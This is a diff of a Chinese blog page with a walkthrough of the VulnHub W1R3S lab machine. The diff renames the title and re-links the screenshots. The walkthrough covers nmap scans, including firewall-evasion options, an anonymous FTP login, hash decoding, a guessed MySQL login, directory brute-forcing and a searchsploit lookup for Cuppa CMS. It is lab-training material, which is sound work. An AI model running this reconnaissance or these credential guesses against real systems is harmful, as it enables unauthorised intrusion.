@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——W1R3S | Hexo</title>
+  <title>我的技术与生活——W | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——W1R3S`
+    document.title = `我的技术与生活——W`
   </script>
 <meta name="generator" content="Hexo 7.3.0"></head>
 
@@ -351,7 +351,7 @@
 
 <div class="article-container">
   <div class="article">
-    <h1 class="article-title">W1R3S</h1>
+    <h1 class="article-title">W</h1>
     <div class="article-info">
       <div class="article-info--item">
         <div class="article-info--info">
@@ -367,7 +367,7 @@
             
           </div>
           
-          <p class="article-info--date">日期：2026-03-13 13:05:26</p>
+          <p class="article-info--date">日期：2026-03-13 15:26:22</p>
         </div>
         <img src="/imgs/default-cover.webp" alt="" class="article-cover">
       </div>
@@ -378,26 +378,26 @@
 <p><strong>注意边做边记录！</strong></p>
 </blockquote>
 <h3 id="靶机下载"><a href="#靶机下载" class="headerlink" title="靶机下载"></a>靶机下载</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/w1r3s-101,220/">https://www.vulnhub.com/entry/w1r3s-101,220/</a></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451992.png" alt="image-20260303180715434"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140445.png" alt="image-20260303180715434"></p>
 <p><strong>本机（攻击机）IP</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451993.png" alt="image-20260303180942436"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140447.png" alt="image-20260303180942436"></p>
 <h2 id="一，nmap-扫描与分析"><a href="#一，nmap-扫描与分析" class="headerlink" title="一，nmap 扫描与分析"></a>一，nmap 扫描与分析</h2><h3 id="隐蔽性原则"><a href="#隐蔽性原则" class="headerlink" title="隐蔽性原则"></a>隐蔽性原则</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_80189643/article/details/139297137">kali 渗透测试——Nmap 扫描补充（绕过防火墙）_nmap 绕过防火墙扫描-CSDN 博客</a></p>
 <h3 id="1-探测存活主机"><a href="#1-探测存活主机" class="headerlink" title="1.探测存活主机"></a>1.探测存活主机</h3><p><strong>探测目标主机，扫描整个 C 段</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.168.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451994.png" alt="image-20260303181450105"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140448.png" alt="image-20260303181450105"></p>
 <blockquote>
 <p><em>-sn</em> 相当于是 <strong>Ping 扫描</strong>，其核心功能是通过发送探测数据包来判断目标主机是否在线，而不会进一步探测端口状态。</p>
 <p><strong>ping 扫描，允许轻量级的入侵而不被注意，知道有多少主机可用状态</strong></p>
 </blockquote>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451995.png" alt="image-20260303182722823"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140449.png" alt="image-20260303182722823"></p>
 <p>**目标主机为 **<code>192.168.168.138</code></p>
 <h3 id="2-端口扫描（发现哪些端口是开放的-默认-TCP）"><a href="#2-端口扫描（发现哪些端口是开放的-默认-TCP）" class="headerlink" title="2 端口扫描（发现哪些端口是开放的&#x2F;默认 TCP）"></a>2 端口扫描（发现哪些端口是开放的&#x2F;默认 TCP）</h3><p><strong>这里我演示</strong></p>
 <p>** **<code>SYN扫描（也称半开扫描）来减少防火墙检测到的可能性。SYN扫描只发送SYN包，不完成整个TCP握手过程。</code> <code>方法：nmap -sS &lt;目标IP地址&gt;</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -p- 192.168.168.138</span><br></pre></td></tr></table></figure>
 
 <p><code>-p-</code> 代表探测所有端口（默认 TCP）</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451996.png" alt="image-20260303183944726"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140450.png" alt="image-20260303183944726"></p>
 <blockquote>
 <p><strong>扫描出的端口：</strong></p>
 <p><strong>21 ftp</strong></p>
@@ -408,7 +408,7 @@
 <p><code>nmap -f &lt;目标IP地址&gt;</code> <code>通过将数据包分割成更小的部分发送，使得防火墙更难识别这些数据包属于一个扫描流量。</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -f -p- 192.168.168.138</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451997.png" alt="image-20260303183958558"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140451.png" alt="image-20260303183958558"></p>
 <p><strong>这些扫描结果普遍相对较慢</strong></p>
 <p><strong>当然也可以手动****调节扫描速度</strong></p>
 <blockquote>
@@ -416,11 +416,11 @@
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate=10000 -p- 192.168.168.138</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451998.png" alt="image-20260303184516517"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140452.png" alt="image-20260303184516517"></p>
 <p><strong>速度快很多，但动静相对更大，这是靶机没有</strong><code>waf</code></p>
 <h3 id="3-UDP-扫描"><a href="#3-UDP-扫描" class="headerlink" title="3,UDP 扫描"></a>3,UDP 扫描</h3><p><strong>也是必不可少的扫描项之一</strong></p>
 <p>**跟默认 TCP 相比，多一个 **<code>-sU</code> 参数</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131451999.png" alt="image-20260303184806314"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140453.png" alt="image-20260303184806314"></p>
 <p><strong>发现仅存的 3306 端口关闭状态，可以不用管 UDP 端口</strong></p>
 <h3 id="4-详细信息扫描（重中之重）"><a href="#4-详细信息扫描（重中之重）" class="headerlink" title="4,详细信息扫描（重中之重）"></a>4,详细信息扫描（重中之重）</h3><p><strong>每一个端口能扫出什么信息，根据信息确定攻击面和渗透的优先级</strong></p>
 <p><strong>先看命令</strong></p>
@@ -431,7 +431,7 @@
 <p><strong><code>-sC</code> (使用默认脚本)</strong>	<strong>调用 Nmap 自带的标准脚本库（位于</strong><code>default</code> 类别）对目标进行探测。</p>
 <p><strong><code>-O</code> (操作系统指纹识别)</strong>	<strong>尝试识别目标主机的操作系统。</strong></p>
 <p><strong>日常打靶足够了</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452000.png" alt="image-20260303185525626"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140454.png" alt="image-20260303185525626"></p>
 <p>** 分析攻击方向**</p>
 <p><strong>21&#x2F;tcp (FTP - vsftpd 3.0.3)</strong> <code>Anonymous FTP login allowed</code> (匿名登录允许)**		**<strong>最重要最优先！</strong></p>
 <p><strong>22&#x2F;open ssh</strong> 我们要连接 ssh 很难，没有用户名也没有密码，只能枚举，<strong>几乎不考虑</strong></p>
@@ -442,7 +442,7 @@
 
 <p><strong>脚本使用总结</strong></p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/441216448"> Nmap 脚本使用总结（看这一篇就够了） - 知乎</a></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452001.png" alt="image-20260303195536906"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140455.png" alt="image-20260303195536906"></p>
 <p>**DOS 攻击不考虑，这里最重要的是找到了 **<code>Wordpress login page</code> 这个字段</p>
 <p><img src="https://ps.w.org/apppresser/trunk/screenshot-1.png?rev=3416300" alt="img"></p>
 <blockquote>
@@ -495,22 +495,22 @@
 <h3 id="6-IPv6-扫描"><a href="#6-IPv6-扫描" class="headerlink" title="6.IPv6 扫描"></a>6.IPv6 扫描</h3><h5 id="IOXIDResolver-工具：发现该-IPv4-的网卡有没有-IPv6-开放"><a href="#IOXIDResolver-工具：发现该-IPv4-的网卡有没有-IPv6-开放" class="headerlink" title="IOXIDResolver 工具：发现该 IPv4 的网卡有没有 IPv6 开放"></a>IOXIDResolver 工具：发现该 IPv4 的网卡有没有 IPv6 开放</h5><p><strong>可以 v4 扫 v6</strong></p>
 <p><strong>也可以 v6 扫 v4</strong></p>
 <p><strong>本质上是爆出全部的 IPv4 和 IPv6 信息</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452002.png" alt="image-20251020195326047"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140456.png" alt="image-20251020195326047"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/mubix/IOXIDResolver/blob/a2e2e933a882c3f63d800465d01cb0207f63487e/IOXIDResolver.py</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452003.png" alt="image-20260303201804526"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140457.png" alt="image-20260303201804526"></p>
 <p><strong>给它权限****读 (r)</strong>、<strong>写 (w)</strong> 和 <strong>执行 (x)</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x IOXIDResolver.py</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452004.png" alt="image-20260303202135733"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140458.png" alt="image-20260303202135733"></p>
 <p><strong>查看帮助，他只有一种命令-t</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 IOXIDResolver.py --help</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452005.png" alt="image-20260303203712438"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140459.png" alt="image-20260303203712438"></p>
 <p><strong>尝试查找靶机是否有 IP v6 地址</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 IOXIDResolver.py -t 192.168.168.138</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452006.png" alt="image-20260303204048796"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140460.png" alt="image-20260303204048796"></p>
 <p><strong>没有我们就不管他了</strong></p>
 <blockquote>
 <p><strong>其他相似工具：</strong></p>
@@ -520,9 +520,9 @@
 <h2 id="二，FTP-渗透–匿名登陆"><a href="#二，FTP-渗透–匿名登陆" class="headerlink" title="二，FTP 渗透–匿名登陆"></a>二，FTP 渗透–匿名登陆</h2><h3 id="1-ftp-连接靶机"><a href="#1-ftp-连接靶机" class="headerlink" title="1.ftp 连接靶机"></a>1.ftp 连接靶机</h3><p><strong>因为我们 nmap 发现靶机存在 ftp 匿名登陆，那么我们就 ftp 连接靶机</strong></p>
 <p><strong>然后会询问你登录名称（ftp 匿名登陆的用户名都是 anoymous）输入</strong></p>
 <p><strong>然后密码直接为空，什么都不用填，回车</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452007.png" alt="image-20260303204418372"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140461.png" alt="image-20260303204418372"></p>
 <p><strong>查看 ftp 系统命令</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452008.png" alt="image-20260303204553459"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140462.png" alt="image-20260303204553459"></p>
 <h3 id="2-发现目录下的文件并全部下载"><a href="#2-发现目录下的文件并全部下载" class="headerlink" title="2.发现目录下的文件并全部下载"></a>2.发现目录下的文件并全部下载</h3><blockquote>
 <p><strong>[!NOTE]</strong></p>
 <p><strong>1.binary mode 提示用二进制模式传输文件</strong></p>
@@ -530,45 +530,45 @@
 <p><strong>2.先关闭交互模式命令 prompt （否则多个文件下载都要求你确认）</strong></p>
 </blockquote>
 <p><strong>看到包含的几个目录，转到 content 目录下，发现有三个文件，尝试下载</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452009.png" alt="image-20260303204817849"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140463.png" alt="image-20260303204817849"></p>
 <p><strong>然后返回上级目录 cd ..   然后看第二个目录 docs</strong>	<strong>发现只有一个文件</strong>	<strong>下载</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452010.png" alt="image-20260303204911128"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140464.png" alt="image-20260303204911128"></p>
 <p><strong>最后下载最后一个目录下的文件</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452011.png" alt="image-20260303205019611"></p>
-<h3 id="3-查看各个文件的内容进行逐个分析"><a href="#3-查看各个文件的内容进行逐个分析" class="headerlink" title="3.查看各个文件的内容进行逐个分析"></a>3.查看各个文件的内容进行逐个分析</h3><p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452012.png" alt="image-20260303205208493"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140465.png" alt="image-20260303205019611"></p>
+<h3 id="3-查看各个文件的内容进行逐个分析"><a href="#3-查看各个文件的内容进行逐个分析" class="headerlink" title="3.查看各个文件的内容进行逐个分析"></a>3.查看各个文件的内容进行逐个分析</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140466.png" alt="image-20260303205208493"></p>
 <p><strong>W1R3S 即 WIRES —–leetspeak（解决的是申请名重复的问题，可以查一下减少渗透过程的陌生感）</strong></p>
 <p><strong>new 新建立的 ftp 服务器的 有线 配置文件 —刚建的可能会有什么问题（思考—比如默认密码，弱口令…）</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452013.png" alt="image-20260303205300735"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140467.png" alt="image-20260303205300735"></p>
 <p><strong>如何判断是什么类型的字符串：</strong></p>
 <p><strong>1.感觉-md5 加密</strong></p>
 <p><strong>2.hash-identifier  会告诉你可能的加密算法</strong>	<strong>这里看到最可能是 MD5</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452014.png" alt="image-20260303205633506"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140468.png" alt="image-20260303205633506"></p>
 <p><strong>3.直接放网页上搜，看提示</strong></p>
 <p><strong>这里尝试破解，先考虑 kali 上的</strong><strong><code>john</code></strong></p>
 <p><strong>先用 vim 写入到新建的</strong><code>md5.txt</code> 文件中，然后丢给 john</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452015.png" alt="image-20260303210553688"><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452016.png" alt="image-20260303210614814"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140469.png" alt="image-20260303210553688"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140470.png" alt="image-20260303210614814"></p>
 <p><strong>这里看到解密失败了，但并不是说</strong><code>john</code> 不好用,而是这个密文有点特殊</p>
 <p><strong>网上搜网站–国际版 bing 搜</strong>	<strong>“md5 cracker”</strong></p>
 <p><a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online</a></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452017.png" alt="image-20260303210314330"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140471.png" alt="image-20260303210314330"></p>
 <p><strong>可惜的是这并不是有用信息</strong></p>
-<p><strong>看下面一行</strong><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452018.png" alt="image-20260303211026665">的 类似于 base64 编码</p>
+<p><strong>看下面一行</strong><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140472.png" alt="image-20260303211026665">的 类似于 base64 编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;SXQgaXMgZWFzeSwgYnVOIG5vdCBOaGFOIGVhc3kuLg==&quot; | base64 -d</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452019.png" alt="image-20260303211215676"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140473.png" alt="image-20260303211215676"></p>
 <p><strong>还是没用</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452020.png" alt="image-20260303205314446"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140474.png" alt="image-20260303205314446"></p>
 <p><strong>这个是一串用****ascii 码</strong>写的 banner</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452021.png" alt="image-20251022173318670"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452022.png" alt="image-20251022173234455"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452023.png" alt="image-20251022173357076"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140475.png" alt="image-20251022173318670"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140476.png" alt="image-20251022173234455"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140477.png" alt="image-20251022173357076"></p>
 <p><strong>其他.txt 文件中  看到有该公司的工作人员（角色的信息&#x2F;功能）   （思路！）</strong></p>
 <p><strong>manager：可能有基于业务的高权限，所有人员的数据…</strong></p>
 <p><strong>IT Dept：基于技术的高权限，系统权限…</strong></p>
 <p><strong>Human Resources：相关人员的最详细信息…</strong></p>
 <p><strong>可能可以根据这些人员进行字典爆破，</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452024.png" alt="image-20260303211507581"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452025.png" alt="image-20260303211633097"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140478.png" alt="image-20260303211507581"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140479.png" alt="image-20260303211633097"></p>
 <p><strong>可以看到</strong><code>ftp</code> 中并没有什么有效信息</p>
 <h2 id="三，看一下-3306-MySQL"><a href="#三，看一下-3306-MySQL" class="headerlink" title="三，看一下 3306 MySQL"></a>三，看一下 3306 MySQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.168.138 -u=root -p=123456</span><br></pre></td></tr></table></figure>
 
@@ -577,14 +577,14 @@
 <p>**如果连接本机数据库，可省略 **<code>-h</code> 或使用 <code>-h localhost</code></p>
 <p><strong><code>-u</code></strong> &#x3D; <strong>user</strong>（用户）**		****<code>-p</code>** &#x3D; <strong>password</strong>（密码）</p>
 </blockquote>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452026.png" alt="image-20260304182812409"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140480.png" alt="image-20260304182812409"></p>
 <p><strong>发现本机 IP 不允许连接它的数据库</strong></p>
 <h2 id="四，web-渗透"><a href="#四，web-渗透" class="headerlink" title="四，web 渗透"></a>四，web 渗透</h2><h3 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h3><p><strong>打开浏览器，看看这个 IP 跑的什么服务</strong></p>
 <p><strong>可以看看有没有什么信息</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452027.png" alt="image-20260304183430792"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140481.png" alt="image-20260304183430792"></p>
 <p>** <strong><strong>Apache2 在 Ubuntu 上的默认欢迎页面</strong>，说明这个网站**刚刚安装完 Apache</strong>，还没<strong>替换或删除</strong>这个默认文件</p>
 <p><strong>查看源码</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452028.png" alt="image-20260304183857770"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140482.png" alt="image-20260304183857770"></p>
 <p><strong>没有什么有用信息。（如用户名，密码，目录…）</strong></p>
 <p><strong>而且该网页也没有图片之类的可以下载下来进行图片分析</strong></p>
 <h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>**下一步，必须也是非常重要的一步，**<strong>目录扫描</strong></p>
@@ -592,35 +592,35 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gobuster</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452030.png" alt="image-20260304190948915"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452031.png" alt="image-20260304185751281"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452032.png" alt="image-20260304185810798"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452033.png" alt="image-20260304190934264"></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452034.png" alt="image-20260304185832039"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140483.png" alt="image-20260304190948915"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140484.png" alt="image-20260304185751281"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140485.png" alt="image-20260304185810798"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140486.png" alt="image-20260304190934264"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140487.png" alt="image-20260304185832039"></p>
 </blockquote>
 <p><strong>dirb</strong> 进行目录扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb 192.168.168.138:80/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452035.png" alt="image-20260304193117808"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140488.png" alt="image-20260304193117808"></p>
 <p><strong>可以看到 dirb 默认可以扫描****多级目录</strong>，更为详细</p>
 <p><strong>gobuster</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452036.png" alt="image-20260304193353477"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140490.png" alt="image-20260304193353477"></p>
 <p><strong>扫描结果更清晰简洁</strong></p>
 <p><strong>由此，我们得到三个目录</strong></p>
 <h3 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h3><p><a target="_blank" rel="noopener" href="http://192.168.168.138/javascript/">http://192.168.168.138/javascript/</a></p>
 <p><strong>不允许访问，只能了解是 apache 跑的 Ubuntu 系统</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452037.png" alt="image-20260304193732063"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140491.png" alt="image-20260304193732063"></p>
 <p><a target="_blank" rel="noopener" href="http://192.168.168.138/wordpress/">http://192.168.168.138/wordpress/</a></p>
 <p><strong>访问 wordpress 发现跳转到 localhost&#x2F;wordpress，且无法访问页面，了解不到对应的版本，无法进行利用</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452038.png" alt="image-20260304193845770"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140492.png" alt="image-20260304193845770"></p>
 <p><strong>访问扫描出的 wordpres 默认登录&#x2F;内容…页面也没有反应</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452039.png" alt="image-20260304194233291"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140493.png" alt="image-20260304194233291"></p>
 <p><a target="_blank" rel="noopener" href="http://192.168.168.138/administrator/">http://192.168.168.138/administrator/</a></p>
 <p><strong>访问 administrator，可以访问，看到是一个程序的安装，页面可交互的地方只有****Next</strong>，而且页面源码也没有有用信息</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452040.png" alt="image-20260304193620991"></p>
-<p><strong>但是！页面****标题显示 cappa CMS</strong>，说明这也是一个内容管理系统 <img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452041.png" alt="image-20260304194622153"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140494.png" alt="image-20260304193620991"></p>
+<p><strong>但是！页面****标题显示 cappa CMS</strong>，说明这也是一个内容管理系统 <img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140495.png" alt="image-20260304194622153"></p>
 <h3 id="cappa-CMS-分析"><a href="#cappa-CMS-分析" class="headerlink" title="cappa CMS 分析"></a>cappa CMS 分析</h3><blockquote>
 <p><strong>[!NOTE]</strong></p>
 <p><strong>接下来我们有****两条路</strong></p>
@@ -630,9 +630,9 @@
 <h4 id="点-Nex"><a href="#点-Nex" class="headerlink" title="点 Nex"></a>点 Nex</h4><p><strong>注意这是靶机的渗透测试，虽然不是实际情况，但也要想到！</strong></p>
 <p><strong>因为是安装，点了 NEXT 会不会对原机器有什么改变，会不会被管理员发现之类？造成系统重启？…</strong></p>
 <p><strong>就算真有也要点，因为走到这里了，方法穷尽。就算之后****不可控也要想到，有预期的</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452042.png" alt="image-20260304200028695"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140496.png" alt="image-20260304200028695"></p>
 <p><strong>进去以后是配置页，数据库和管理员信息。[?]可以看 default 默认信息 。可以填着试试</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452043.png" alt="image-20251022194837812"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140497.png" alt="image-20251022194837812"></p>
 <p><strong>可是安装了但也进不去，交互的按钮只有 back</strong></p>
 <p><strong>走不下去了</strong></p>
 <p><strong>看源码，没有泄漏 CMS 的版本，敏感信息…</strong></p>
@@ -643,24 +643,24 @@
 <p><strong>也就是里面包含了下面这个网页中的所有公开漏洞</strong></p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers</a></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452044.png" alt="image-20260304200819818"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140498.png" alt="image-20260304200819818"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit cuppa cms          </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452045.png" alt="image-20260304201008029"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140499.png" alt="image-20260304201008029"></p>
 <p>** 发现只有一条数据（几条无所谓，只影响筛查难度）**		<strong>ps：可以查一下 wordpress 的，具体情况要带上版本</strong></p>
